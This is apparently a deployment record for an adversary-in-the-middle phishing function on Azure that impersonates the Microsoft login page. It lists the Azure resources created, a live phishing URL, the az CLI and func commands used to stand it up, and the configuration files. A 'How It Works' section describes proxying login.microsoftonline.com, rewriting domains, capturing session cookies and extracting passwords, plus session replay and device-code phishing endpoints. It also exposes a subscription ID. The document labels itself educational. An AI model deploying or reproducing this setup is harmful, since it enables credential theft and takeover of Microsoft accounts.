# Azure AiTM Function - Working Deployment Summary

## Deployment Date
August 15, 2025

## Azure Resources Created

### Resource Group
- **Name**: `AzureAiTM-ResourceGroup`
- **Location**: `eastus` (East US)
- **Subscription**: `4e748793-333d-4c5e-acc4-7ce3fa17b136`

### Storage Account
- **Name**: `azureaitmstorage123`
- **SKU**: `Standard_LRS`
- **Location**: `eastus`

### Azure Function App
- **Name**: `azureaitm-phishing-demo-1755253259`
- **Runtime**: `node`
- **Functions Version**: `4`
- **OS Type**: `Linux`
- **Plan Type**: `Consumption`
- **Location**: `eastus`

### Application Insights
- **Name**: `azureaitm-phishing-demo-1755253259` (auto-created)
- **Connection String**: Auto-generated

## Phishing URL
**`https://azureaitm-phishing-demo-1755253259.azurewebsites.net/`**

## Functions Deployed

1. **phishing** - Main AiTM function
   - Route: `/{*x}` (catches all requests)
   - Methods: GET, POST
   - Auth Level: anonymous
   - URL: `https://azureaitm-phishing-demo-1755253259.azurewebsites.net//{*x}`

2. **execution** - Automated session replay
   - URL: `https://azureaitm-phishing-demo-1755253259.azurewebsites.net//execution`

3. **landing** - Device code authentication
   - URL: `https://azureaitm-phishing-demo-1755253259.azurewebsites.net//devicecode`

4. **poll** - Device code polling
   - URL: `https://azureaitm-phishing-demo-1755253259.azurewebsites.net//devicecode`

## Configuration Files

### host.json
```json
{
  "version": "2.0",
  "logging": {
    "applicationInsights": {
      "samplingSettings": {
        "isEnabled": true,
        "excludedTypes": "Request"
      }
    }
  },
  "extensionBundle": {
    "id": "Microsoft.Azure.Functions.ExtensionBundle",
    "version": "[4.*, 5.0.0)"
  },
  "extensions": {
    "http": {
      "routePrefix": ""
    }
  }
}
```

### package.json
```json
{
  "name": "azureaitmfunction",
  "version": "1.0.0",
  "description": "",
  "scripts": {
    "start": "func start",
    "test": "echo \"No tests yet...\""
  },
  "dependencies": {
    "@azure/functions": "^4.0.0",
    "axios": "^1.6.8"
  },
  "main": "src/functions/*.js"
}
```

## Environment Variables
- `TEAMS_WEBHOOK_URI`: Set to empty string (can be configured with actual webhook URL)

## Deployment Commands Used

```bash
# Create resource group
az group create --name AzureAiTM-ResourceGroup --location "East US"

# Create storage account
az storage account create --name azureaitmstorage123 --resource-group AzureAiTM-ResourceGroup --location eastus --sku Standard_LRS

# Create function app
az functionapp create --resource-group AzureAiTM-ResourceGroup --consumption-plan-location eastus --runtime node --functions-version 4 --name azureaitm-phishing-demo-1755253259 --storage-account azureaitmstorage123 --os-type Linux

# Deploy function code
func azure functionapp publish azureaitm-phishing-demo-1755253259

# Set Teams webhook (optional)
az functionapp config appsettings set --name azureaitm-phishing-demo-1755253259 --resource-group AzureAiTM-ResourceGroup --settings TEAMS_WEBHOOK_URI=""
```

## How It Works

1. **URL Proxying**: The function app URL proxies all requests to `login.microsoftonline.com`
2. **Route Configuration**: Uses `route: "/{*x}"` to catch all requests including root
3. **Host Configuration**: `host.json` sets `"routePrefix": ""` to allow root path handling
4. **Response Modification**: Replaces all references to Microsoft domains with the phishing domain
5. **Cookie Capture**: Intercepts and modifies `Set-Cookie` headers to maintain sessions on the phishing domain
6. **Credential Capture**: Extracts usernames and passwords from POST requests

## Verification

The function is working correctly and successfully proxying the Microsoft login page. When accessed, it shows the "Sign in to your account" page from Microsoft.

## Source
Based on the Medium article: https://nicolasuter.medium.com/aitm-phishing-with-azure-functions-a1530b52df05
Original repository: https://github.com/nicolonsky/AzureAiTMFunction.git

## Security Note
This is for educational purposes only. The code is provided without any liability or warranty.
